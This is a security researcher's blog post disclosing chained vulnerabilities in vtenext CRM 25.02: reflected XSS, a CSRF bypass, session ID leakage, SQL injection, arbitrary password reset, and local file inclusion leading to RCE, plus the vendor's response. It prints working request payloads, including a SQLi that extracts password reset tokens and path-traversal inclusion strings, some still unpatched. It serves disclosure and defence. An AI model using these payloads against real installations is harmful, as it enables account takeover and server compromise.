---
title: "Vtenext 25.02: A three-way path to RCE"
source: "https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/"
author:
  - "Mattia (0xbro) Brollo"
published: 2025-08-12
created: 2025-09-04
description: "Multiple vulnerabilities in vtenext 25.02 and prior versions allow unauthenticated attackers to bypass authentication through three separate vectors, ultimately leading to remote code execution on the underlying server."
tags: ["clippings/articles", "_inbox"]
---
# Vtenext 25.02: A three-way path to RCE

![](https://blog.sicuranext.com/content/images/2025/08/vtenext2502-thumb2.png)

> [!summary]
> > The article details multiple critical vulnerabilities in VTENEXT CRM versions 25.02 and earlier, leading to authentication bypass and remote code execution (RCE). The research uncovered three distinct authentication bypass vectors:
> 1.  A chain involving Reflected Cross-Site Scripting (XSS), CSRF token validation bypass via HTTP method tampering, and Session Cookie Information Disclosure. This allows session hijacking.
> 2.  Another chain utilizing Reflected XSS, CSRF token bypass, and multiple SQL injection vulnerabilities to extract sensitive data like password reset tokens, enabling account takeover.
> 3.  An Arbitrary Password Reset vulnerability (patched in version 25.02.1) that allowed resetting any user's password with only their username, requiring no user interaction.
> 
> Once authenticated, RCE can be achieved through:
> *   Multiple Local File Inclusion (LFI) vulnerabilities, which could be leveraged with pre-existing gadgets like `pearcmd.php` to write arbitrary PHP files and execute code.
> *   The module upload functionality, which allows administrators to upload custom modules containing web shells, leading to RCE by design.
> 
> The researcher attempted responsible disclosure over three months without success. A silent patch was eventually released for the arbitrary password reset vulnerability, but other issues remain unaddressed. The vendor later attributed the lack of response to emails being marked as spam. The article emphasizes the risk to small and medium-sized Italian companies using VTENEXT and the importance of prompt updates and responsible disclosure.

### Summary

- **Product**: [VTENEXT CRM](https://www.vtenext.com/?ref=blog.sicuranext.com)
- **Vendor**: [vtenext](https://www.vtenext.com/?ref=blog.sicuranext.com)
- **Severity**: Critical
- **Impact**: Authentication Bypass and Remote Code Execution
- **Affected Version(s)**: 25.02\* and below
- **Tested Version(s)**: 20.04, 24.02, 25.02, 25.02.1

*\*XSS vectors can still be exploited in version 25.02.1*

### Preface and history of the research

TL;DR: In my spare time, I happen to research vulnerabilities in products or services that I have encountered in the past and have pinned down over time. In the last few months, I decided to take a closer look at a *CRM solution*  used by a fair number of small and medium-sized Italian companies, named  **VTENext**.

VTENext is an Italian ~~open~~ closed-source CRM platform available both On-Premises and in the Cloud, that seamlessly integrates with a business process management (BPMN) engine to offer comprehensive automation across marketing, sales, post‑sales, and customer support workflows.

Although vtenext **began** as an open-source CRM, it has evolved into a ****commercially driven product****, with limited open access compared to its origins.

At the time of writing, ****two**** different ****main versions**** exist:

- ****Open Source version****: `vtenext ce 20.04.2` (last update almost 4 years ago)
- - [https://github.com/VTECRM/vtenext](https://github.com/VTECRM/vtenext?ref=blog.sicuranext.com)
- ****Latest version****: `vtenext 25.02` (last update in July)
- - Trial version on [https://www.vtenext.com/en/free-trial/](https://www.vtenext.com/en/free-trial/?ref=blog.sicuranext.com)

The research uncovered **several critical flaws** that, when combined, allowed (and still allow) users to completely bypass the login mechanism, authenticate on behalf of another user and, in most situations, execute remote code on the underlying server.

Following the discovery, I tried multiple times to contact the vtenext team and developers, both through official and unofficial channels, but we were never successful:

- On May 28th, we contacted vtenext for the first time through the official contact form on their site and by sending an email asking for a responsible disclosure process. We received a default message back, but no further contacts.
- On June 5th, we contacted vtenext for the second time. We received a default message back again, but no further contacts.
- On July 13th, we attempted to contact the developers of vtenext via a direct channel on LinkedIn, but without success.

Around **July 24th, 2025**, vtenext released  ***version 25.02.1***, which included a **security patch** for the third (and most severe) authentication bypass vector mentioned in the blog post. **As of this writing, that particular vulnerability has been fixed**. However, the other vulnerabilities remain exploitable and unaddressed.

**August 13th update**: After notification of the article's publication, the vtenext team responded:

> "Unfortunately, previous communications sent from a Gmail address may have been marked as spam due to the sender's format (0xbro), and we therefore did not see the message. Some of the vulnerabilities reported have already been corrected recently, as they were detected during VAPT activities conducted by third parties that we commission periodically. We will contact you again as soon as we have the details of the resolution or for any further information, as we always do with independent researchers who write to us, as this is not the first time we have collaborated with freelance professionals. \[...\] The lack of response was not due to negligence, but to the circumstances described above"

Given the existence of a patch for a critical vulnerability and the lack of communication and collaboration regarding the product security, we have decided to make our research public. Our goal is to ****draw attention to the software's security posture**** and ****highlight the importance of updating to the latest available version**** while waiting for the other vulnerabilities to be fixed.

With access to the legacy codebase but also to the stable latest working environment, I adopted a [**diff-testing approach**](https://en.wikipedia.org/wiki/Differential_testing?ref=blog.sicuranext.com)  focusing on static  *code analysis*  and  *debugging*  on a [local instance](https://github.com/0xb120/vtenext-research?ref=blog.sicuranext.com) of the  **open-source version**, while conducting  *practical exploitation*  and  *dynamic testing*  against the  **latest demo** release.

An initial *semgrep*  scan using default [PHP rules](https://github.com/semgrep/semgrep-rules/tree/develop/php?ref=blog.sicuranext.com) gave the following results:

```bash
semgrep --dataflow-traces --force-color --matching-explanations
    --text-output=scans/$(date "+%Y%m%d").txt
    --sarif-output=scans/$(date "+%Y%m%d").sarif 
    --no-git-ignore 
    --config /opt/semgrep-rules/php/lang/security/
```

run semgrep with default PHP rules

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/semgrep.png)

semgrep scan result

Long story short, 1000+ semgrep code findings later, I had *three*  different  **authentication bypass vectors**  as well as some  *potential* **code execution primitives** (and a module-based code execution by design, but more on this later).

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/tenor--1-.gif)

Sample HomeWidgetBlockList HTTP request

Oh… and there’s probably *a lot* more to be found. For now, however, let’s take a closer look at the three attack vectors 🔎.

## Authentication Bypass: Vector #1

Both the first and second attack vectors necessitate **user interaction**  for successful exploitation and rely on a sequence of  *multiple vulnerabilities* that collectively enable the attack.

The first vector involves an exploitation chain featuring the following:

- **Reflected Cross-Site Scripting (XSS)** via POST request
- **CSRF token validation bypass**  via  **HTTP Method Tampering**
- **Session Cookie Information Disclosure**

### Reflected Cross-Site Scripting (XSS) via POST request

A **reflected cross-site scripting**  vulnerability exists in the  `modules/Home/HomeWidgetBlockList.php` because of two issues:

- The `widgetId`  keys contained in the  `widgetInfoList`  JSON arrays are  **reflected**  within the server response  **without proper sanitisation**.
- The *JSON response*  is delivered with a  `Content-Type: text/html`  header instead of the correct  `Content-Type: application/json`, which allows the browser to  *interpret*  and  *execute* embedded JavaScript or HTML content.
![](https://blog.sicuranext.com/content/images/size/w600/2025/08/post-based-xss1.png)

Sample HomeWidgetBlockList HTTP request

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/post-based-xss2.png)

widgetId reflected in HTTP response

As a result, this combination enables the injection and execution of arbitrary JavaScript code within the application:

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/post-based-xss3.png)

Injected a simple alert(1) XSS payload

### CSRF token validation bypass via HTTP Method Tampering

The application processes input parameters from *several* routes, utilising the [`$_REQUEST`](https://www.php.net/manual/en/reserved.variables.request.php?ref=blog.sicuranext.com)  global variable, therefore accepting  **both** POST and GET HTTP requests.

```php
...
widgetInfoList = Zend_Json::decode($_REQUEST['widgetInfoList']);
...
```

code/modules/Home/HomeWidgetBlockList.php

Due to this behaviour, combined with **insufficient validation**  of  *CSRF tokens*  in  `include/utils/VteCsrf.php`, it is possible to entirely  **bypass**  the check for the  `__csrf_token` field.

This can be achieved by *switching*  a POST request to a GET request and  *omitting* the token parameter altogether.

```php
/**
* The name of the magic CSRF token that will be placed in all forms, i.e.
* the contents of <input type="hidden" name="$name" value="CSRF-TOKEN" />
*/
'input-name' => '__csrf_token',
...
public function csrf_check($fatal = true) {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true;
    
    //  csrf_start();
    $name = $this->config['input-name'];
    ...
    return $ok;
}
```

include/utils/VteCsrf.php

As a result, the previously *POST-based*  XSS can be  **transformed**  into a traditional  *GET-based* XSS, significantly lowering the exploitation barrier, as it eliminates the need to obtain or predict a valid CSRF token beforehand.

![](https://blog.sicuranext.com/content/images/2025/08/tenor.gif)

Cross-Site Scripting without the need for \_\_csrf\_token

Reflected Cross-Site Scripting (XSS) via POST request:

```
POST /42870/index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1

__csrf_token=sid%3A027909b0225a4f00eaa4a6c94a59a64ae885c639%2C1745487458
&widgetInfoList=[{"widgetId":"https://lujdstavpt0g06dxoiai9g8okfq6ew2l.oastify.com<img src onerror=alert(1)>","widgetType":"URL"}]
```

Reflected Cross-Site Scripting (XSS) via GET request:

```
GET /42870/index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://lujdstavpt0g06dxoiai9g8okfq6ew2l.oastify.com<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
```
![](https://blog.sicuranext.com/content/images/size/w600/2025/08/get-xss.png)

Cross-Site Scripting without the need for \_\_csrf\_token

**Session cookies**  in VTENext are  *secured*  using the  `HttpOnly` flag, which helps mitigate the risk of arbitrary client-side scripts accessing the cookie.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/cookies.png)

PHPSESSID cookies protected with the HttpOnly flag

An **information disclosure**  on the  *Touch*  module, however, *exposes*  the  **PHPSESSID** value, effectively making the protection of the HttpOnly flag useless.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/info-disclosure.png)

GET request to index.php?module=Touch&action=ws

In the same way that `phpinfo()` can be used to leak secured cookies [<sup>4</sup>](https://seclists.org/webappsec/2006/q2/181?ref=blog.sicuranext.com) [<sup>5</sup>](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it?ref=blog.sicuranext.com) [<sup>6</sup>](https://www.youtube.com/watch?v=tNFuy9h2pF0&ref=blog.sicuranext.com), we can use our  **oracle**  to read the victim’s session and  **steal it through the XSS**.

![](https://blog.sicuranext.com/content/images/2025/08/giphy.gif)

0:00 / 0:55 Cross-Site Scripting vulnerability chain PoC video

### Demo:

<video src="https://blog.sicuranext.com/content/media/2025/08/xss-video-redacted.mp4" width="1920" height="1200"></video>

Cross-Site Scripting vulnerability chain PoC video

## Authentication Bypass: Vector #2

Just like the first one, the second attack vector also relies on **user interaction** to work.  
It uses a *similar* chain of vulnerabilities to carry out the attack, composed of:

- **Reflected Cross-Site Scripting (XSS)** via POST request *(like above)*
- **CSRF token validation bypass**  via  **HTTP Method Tampering** *(like above)*
- **SQL Injection**

### SQL Injection

**Multiple SQL injections**  exist in  `modules/Fax/EditView.php`  because of how the application  *builds*  and  *executes* queries.

```php
...
if($_REQUEST["internal_mailer"] == "true") {
  $smarty->assign('INT_MAILER',"true");
    $rec_type = $_REQUEST["type"];
    $rec_id = $_REQUEST["rec_id"];
    $fieldname = $_REQUEST["fieldname"];
  ...
  if($rec_type == "record_id") {
        $type = $_REQUEST['par_module'];
        //check added for email link in user detail view
        // crmv@64542
        $modInstance = CRMEntity::getInstance($type);
        if(substr($fieldname,0,2)=="cf")
            $tablename = $modInstance->customFieldTable[0];
        else
            $tablename = $modInstance->table_name;
        // crmv@64542e
        if($type == "Users")
            $q = "select $fieldname from $tablename where id=?";    
        elseif($type == "Leads") 
            $q = "select $fieldname from $tablename where leadaddressid=?";
        elseif ($type == "Contacts")
            $q = "select $fieldname from $tablename where contactid=?";
        elseif ($type == "Accounts")
            $q = "select $fieldname from $tablename where accountid=?";
        elseif ($type == "Vendors")
            $q = "select $fieldname from $tablename where vendorid=?";
        $to_fax = $adb->query_result($adb->pquery($q, array($rec_id)),0,$fieldname);
    } elseif ($rec_type == "email_addy") {
        $to_fax = $_REQUEST["email_addy"];
    }
    $smarty->assign('TO_FAX',trim($to_fax,",").",");
```

**modules/Fax/EditView.php**

The code in question has two main problems:

1. Although *prepared statements* are used with `$adb->pquery()`, the query that is executed (`$q`) is created by  **injecting**  the user’s input  **directly** inside it, thus making prepared statements useless.
2. Since we can specify *directly* via `$_REQUEST['fieldname']` the field we want to read, we can basically **extract**  the value of  *any* field within the tables we can access.
![](https://blog.sicuranext.com/content/images/2025/08/giphy--1-.gif)

Admin user added to the Fax receivers

Given the points above, a *legitimate* request has the following format:

```
GET /index.php?module=Fax&action=EditView&internal_mailer=true
&par_module=Users&fieldname=user_name&type=record_id&rec_id=1 HTTP/1.1
```

The *resulting query* is:

```sql
select user_name from vte_users where id=1;
```

And the application adds the selected *username* to the fax recipients:

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/sqli1.png)

Admin user added to the Fax receivers

Because we can control via `$_REQUEST['fieldname']` **which field**  we want to  **extract**, let’s search for other interesting data. With  `par_module=Users`, we can extract  *any*  column from the  `vte_users` table:

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/db-vte_users.png)

vte\_users table description

`user_password`  looks to me like a  *very*  good candidate, so let’s pass that column to the  `fieldname`  HTTP field and  **extract**  the current user’s  **hashed password**:

```
GET /index.php?module=Fax&action=EditView
&internal_mailer=true&par_module=Users&fieldname=user_password
&type=record_id&rec_id=1 HTTP/1.1
```

Resulting query:

```sql
select user_password from vte_users where id=1;
```
![](https://blog.sicuranext.com/content/images/size/w600/2025/08/sqli2.png)

User admin’s hashed password extracted and added to the Fax receivers

This is already interesting, but extracting the *hash*  of a password then  *takes time*  to crack, and furthermore, does  *not* guarantee 100% success, as the password could be complex and not easily recoverable.

We want an exploit that **always** works and doesn’t waste our time, right?

Since the query that is constructed **directly integrates the input**  we pass to it, we can inject a  **subquery**  that allows us to extract  *any* other field from the DB.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/sqli-example.png)

Example of arbitrary extraction of data using a subquery

What other fields in the database could be helpful to us? I think **password reset tokens** could be just what we need!

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/db-vte_userauthtoken.png)

vte\_userauthtoken table description

In the same way as before, we can build a **subquery**  that  **extracts the password reset token**  for a user of our choice, then  **use**  this token to  **set an *arbitrary* password** and log in as that user.

```
GET /index.php?module=Fax&action=EditView&internal_mailer=true
&par_module=Users&fieldname=(select%20token%20from%20vte_userauthtoken%20where%20userid=1)
&type=record_id&rec_id=1 HTTP/1.1
```

The resulting query is:

```sql
select (select token from vte_userauthtoken where userid=1) from vte_users where id=1;
```
![](https://blog.sicuranext.com/content/images/size/w600/2025/08/sqli3.png)

Example of arbitrary extraction of a password reset token using a subquery

At this point, we can *exfiltrate* the token in the same way as we did with the session cookie and complete the attack.

![](https://blog.sicuranext.com/content/images/2025/08/giphy--2-.gif)

0:00 / 0:43 Authentication bypass PoC video

## Authentication Bypass: Vector #3

Account takeovers are cool, but the need for user interaction makes it *less likely*  that a user will fall for it. This third attack vector, therefore, **will not require any interaction from the user**  to be completed, *just the way we like*.

ℹ️

The vulnerability has been ****patched**** in version 25.02.1

### Arbitrary Password Reset

The `hub/rpwd.php`  password reset endpoint exposes an  `action`  (`change_password`) that does not enforce adequate security validations, **making it possible to reset any user’s credentials** with only their username.

At \[1\], the `rpwd.php`  endpoint creates a  `RecoverPwd()` object and calls the `process()` function, *forwarding* at the same time, the current request.

```php
require('../config.inc.php');
...
require_once('modules/Users/RecoverPwd.php');

RequestHandler::validateCSRFToken(); // crmv@171581

$RP = new RecoverPwd();
$RP->process($_REQUEST, $_POST); // [1]
```

**hub/rpwd.php**

At \[2\], the `action`  field coming from the forwarded request is  *read*  and used at \[3\] to determine which  *function*  to  *call*.

Providing “ *change\_password* ” as the  `action`, we then enter at \[4\] the  `displayChangePwd()` function, which also takes an *arbitrary* `user_name`  value from the original forwarded request and uses it to  *instanciate*  at \[5\] the  `Users` object.

```php
class RecoverPwd {
    public function process(&$request, &$post) {
        global $default_charset;
        $action = $request['action']; // [2]
        
        $smarty = $this->initSmarty();
        header('Content-Type: text/html; charset=' . $default_charset);
        
        if ($action == 'change_password') { // [3]
            $body = $this->displayChangePwd($smarty, $post['user_name'], $post['confirm_new_password']);
        } elseif ($action == 'recover') {
            $body = $this->displayRecoverLandingPage($smarty, $request['key']);
        ...
        } elseif ($action == 'change_old_pwd_send') {
            $body = $this->displayChangeOldPwdSend($smarty, $post['key'], $post['old_password'], $post['new_password']);
        } else {
            $body = $this->displayMainForm($smarty);
        }
        ...
    }
}
...
public function displayChangePwd($smarty, $username, $newpwd) { // [4]
    // removed validateUserAuthtokenKey, there is already the CSRFT check in rpwd.php
    $current_user = CRMEntity::getInstance('Users');
    $current_user->id = $current_user->retrieve_user_id($username); //[5]
    $current_user->retrieve_entity_info($current_user->id,'Users');
    ...
    if (!$current_user->checkPasswordCriteria($newpwd,$current_user->column_fields)) { // [6]
        ...
    } elseif ($current_user->id == 1 && isFreeVersion()) { // [7]
        ... // for the demo version
    } else {
        $current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true);
        emptyUserAuthtokenKey($this->user_auth_token_type,$current_user->id); // [8]
        ...
    }
}
```

**modules/Users/RecoverPwd.php**

If the provided password *satisfies the criteria*  \[6\] and the instance is  *not a trial or free version*  \[7\], the  `change_password`  method of the  `User` object is invoked \[8\].

It receives a *fake current password*  as the first argument, and an  *arbitrary new password*, taken from the  `confirm_new_password`  field of the forwarded request, as the second argument. It is also important to see that the function is called by setting  `skipOldPwdCheck`  to  `true`.

At \[9\], the condition checks if the new password *is not set*  or  *is an empty string*, while at \[10\], the code checks if  *the current user is not an admin*  and if  *the old password check should not be skipped*. If both conditions are true, the function verifies whether the provided current password is correct, but because the function was called with  `skipOldPwdCheck = true` **this never happens**.

Finally, at \[11\], the update is performed.

```php
function change_password($user_password, $new_password, $dieOnError = true, $skipOldPwdCheck = false) // crmv@34947
    {
        ...
        if( !isset($new_password) || $new_password == "") { // [9]
            ...
        }
        if (!is_admin($current_user) && !$skipOldPwdCheck) { // [10]
            ...
        }
        //set new password [11]
        $crypt_type = $this->DEFAULT_PASSWORD_CRYPT_TYPE;
        $encrypted_new_password = $this->encrypt_password($new_password, $crypt_type);

        $query = "UPDATE $this->table_name SET user_password=?, confirm_password=?, crypt_type=? where id=?";
        $this->db->startTransaction();
        $this->db->pquery($query, array($encrypted_new_password, $encrypted_new_password, $crypt_type, $this->id));
        if($this->db->hasFailedTransaction()) {
            if($dieOnError) {
                die("error setting new password: [".$this->db->database->ErrorNo()."] ".
                        $this->db->database->ErrorMsg());
            }
            return false;
        }
        //crmv@30007
        else{
            $this->db->completeTransaction();
        }
        //crmv@30007e

        $current_user->saveLastChangePassword($this->id); //crmv@28327
        ...
```

**modules/Users/Users.php**

![](https://blog.sicuranext.com/content/images/2025/08/giphy--3-.gif)

0:00 / 0:43 Authentication bypass PoC video

### PoC

<video src="https://blog.sicuranext.com/content/media/2025/09/authbypass.mp4" width="1358" height="810"></video>

Authentication bypass PoC video

---

## Remote Code Execution

Once we have bypassed the login and obtained authenticated access (ideally with *elevated*  privileges), we can achieve  **arbitrary code execution**  in  *at least* two different ways, depending on the conditions we find ourselves in.

### Multiple Local File Inclusions

The application contains **multiple Local File Inclusion (LFI) vulnerabilities**  because it incorporates  *user input*  into  *file inclusion functions*  without proper  *validation*  or  *sanitisation*.

In all identified cases, *path traversal sequences* (e.g., `../`) can be used to **include arbitrary files**, with the only limitation being that the target file must have a *`.php` extension*.

![](https://blog.sicuranext.com/content/images/2025/08/giphy--4-.gif)

Exploitation of the Local File Inclusion vulnerability in LayoutBlockListUtils.php

Due to the ***fixes***  applied to address  [***CVE-2023-46694***](https://app.opencve.io/cve/CVE-2023-46694?ref=blog.sicuranext.com)  and the presence of a  ***comprehensive***  —  *though not perfect, for obvious reasons*  —  ***deny-list***  of  ***malicious file extensions***, *no viable method was identified*  for  *uploading arbitrary `.php` files*  for inclusion. Furthermore, *no useful gadgets*  were found within the  *pre-existing code*.

```php
// files with one of these extensions will have '.txt' appended to their filename on upload
// upload_badext default value = php, php3, php4, php5, pl, cgi, py, asp, cfm, js, vbs, html, htm
//crmv@16312 crmv@189149 crmv@195993
$upload_badext = array(
    'php', 'php3', 'php4', 'php5', 'pht', 'phtml', 'phps', 'phar',
    'htm', 'html', 'xhtml', 'js', 'pl', 'py', 'rb',
    'cgi', 'asp', 'cfm', 'vbs', 'jsp',
    'exe', 'bin', 'bat', 'com', 'sh', 'dll', 'msi',
    'htaccess', 'htpasswd'
);
//crmv@16312e crmv@189149e crmv@195993e
```

**config.inc.php**

In the absence of useful gadgets, as a *proof of concept*, I will therefore use the  `copyright.php` file, which is created during installation and displays the copyright banner.

#### Local File Inclusion in LayoutBlockListUtils.php

```php
function deleteCustomField(){
    global $adb,$table_prefix, $metaLogs; // crmv@49398
    require_once('modules/Reports/Reports.php');
    $fld_module = $_REQUEST["fld_module"];
    
    ...
    
    if($fld_module == 'Calendar' || $fld_module == 'Events'){
        $focus = CRMEntity::getInstance('Activity');
    }else{
        require_once("modules/$fld_module/$fld_module.php");
        $focus = new $fld_module();
    }
```

**modules/Settings/LayoutBlockListUtils.php**

We can trigger the Local File Inclusion by including in the query string the `&fld_module=../../copyright` payload:

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/lfi1.png)

Exploitation of the Local File Inclusion vulnerability in LayoutBlockListUtils.php

#### Local File Inclusion in ActivityAjax.php

```php
...
require_once('modules/Calendar/'.$_REQUEST['file'].'.php');
...
```

**modules/Calendar/ActivityAjax.php**

We can exploit the Local File Inclusion in the same way as before:

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/lfi2.png)

Exploitation of the Local File Inclusion vulnerability in ActivityAjax.php

#### Local File Inclusion in wdCalendar.php

```php
//crmv@17001
if ($_REQUEST['subfile'] != '')
    $file = $_REQUEST['subfile'];
else
    $file = "sample";
...
// crmv@187406e
include("modules/Calendar/wdCalendar/$file.php");
```

**modules/Calendar/wdCalendar.php**

We can trigger the LFI by providing the following parameters: `/index.php?module=Calendar&action=wdCalendar&subfile=../../../copyright`

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/lfi4.png)

Exploitation of the Local File Inclusion vulnerability in wdCalendar.php

### RCE using pearcmd.php

Depending on the *installation type*  and the  *presence of additional software*, such as  *other sites*  in virtual hosts or  *extra PHP modules/plugins*, ***exploitable gadgets may be present***. In such cases, these gadgets can be leveraged to our advantage, thanks to the ability to use  *path traversal* to navigate the file system.

A *famous*  example is the presence of the  **PEAR PHP framework**  in applications installed by default on many  *Docker containers*  that use  *PHP*  and most  *modern-day systems*.

If `pearcmd.php`  is present on the system, this  ***well-known technique*** [<sup>8</sup>](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/?ref=blog.sicuranext.com) [<sup>9</sup>](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/?ref=blog.sicuranext.com#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE) [<sup>10</sup>](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html?ref=blog.sicuranext.com#0x06-pearcmdphp)  can be used to include it, **create PHP files with arbitrary content**  within the web server directory (or anywhere, for later inclusion), ultimately  **leading**  to  **Remote Code Execution (RCE)**.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/pearcmd.png)

Included pearcmd.php and created a gadget file withing the web root containing arbitrary PHP code

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/pearcmd2.png)

Loaded the gadget file and executed the arbitrary code ( phpinfo() )

### Module Upload

VTENext *administrators*  can develop and upload  [**custom modules**](https://usermanual.vtenext.com/search?term=module&ref=blog.sicuranext.com), user-defined components or extensions that expand the standard functionality of the platform.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/vtemodule2.png)

Management of custom modules within the ModuleManager area

This functionality is accessible via the **ModuleMaker**  and  **ModuleManager**  sections, where administrators can  *create*  new modules based on standard templates, *manage*  existing ones, *export*  installed modules, or  ***import custom modules developed externally***.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/vtemodule1.png)

Option for creating custom modules within the ModuleMaker area

VTENext is built on top of **Vtiger 5/6 core**, ***and so are its modules***. To keep things concise, I won’t delve into the full development process of a custom module here. However, below you’ll find the  *documentation*  provided by my assistant (ChatGPT, yes, I’m talking about you!), along with a  *basic module template* to get you started.

- Vtiger Developer Guide
- Vtiger Module Developer Guide
- VtigerCRM\_5.2.0\_Vtlib.pdf

In short, I **created a simple module**  containing a classic  *PHP web shell*  and  **imported it**  into the platform via  `Settings → Module Settings → Custom Modules → Import New Module`.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/poc-module.png)

Sample custom module containing the web shell

This effectively gives us Remote Code Execution, by design:

<video src="https://blog.sicuranext.com/content/media/2025/08/Screencast-from-2025-06-21-17-31-33.mp4" width="1319" height="692"></video>

Number of vtenext installations analysed by Censys

![](https://blog.sicuranext.com/content/images/2025/08/giphy--5-.gif)

Number of vtenext installations analysed by Censys

## Conclusion

**Despite multiple attempts to responsibly disclose these vulnerabilities, the vendor failed to acknowledge or respond for over three months.** Eventually, a **silent patch**  was released, with  *no mention of the issue*  or  *credit given*.

Although vtenext is a relatively unknown application *worldwide*, ***a fair number*** of companies in Italy use this solution.

![](https://blog.sicuranext.com/content/images/size/w600/2025/08/censys.png)

Number of vtenext installations analysed by Censys

It is concerning to see how some vendors **neglect the security**  of the products they sell and fail to implement a  **responsible disclosure program**  to collaborate with researchers. All of this ultimately  **harms customers**, particularly  ***small and medium-sized businesses*** that often lack robust vulnerability and risk management strategies, leaving them unknowingly exposed to significant risks.

**On August 13th,** after notification of the article's publication, the vtenext team responded:

> "Unfortunately, previous communications sent from a Gmail address may have been marked as spam due to the sender's format (0xbro), and we therefore did not see the message. Some of the vulnerabilities reported have already been corrected recently, as they were detected during VAPT activities conducted by third parties that we commission periodically. We will contact you again as soon as we have the details of the resolution or for any further information, as we always do with independent researchers who write to us, as this is not the first time we have collaborated with freelance professionals. \[...\] The lack of response was not due to negligence, but to the circumstances described above"

Due to its *open-source nature*, **other applications**  derived from vtenext or those with similar origins  **may also share these same vulnerabilities**, potentially increasing the total number of affected sites.

- **28/05/2025**: Contacted vtenext for the first time through various communication channels, but did not receive any response.
- **05/06/2025**: Contacted vtenext for the second time, but didn’t receive any response again.
- **09/06/2025**: Submitted CVE Request 1879483 to MITRE (still awaiting official CVEs).
- **13/07/2025**: Attempted to contact the developers of vtenext via a direct channel on LinkedIn, but without success.
- **24/07/2025**: Vendor released version 25.02.1 containing a silent patch for the Arbitrary Password Reset vulnerability.
- **12/08/2025**: Full disclosure, since a patch exists and the grace period has expired.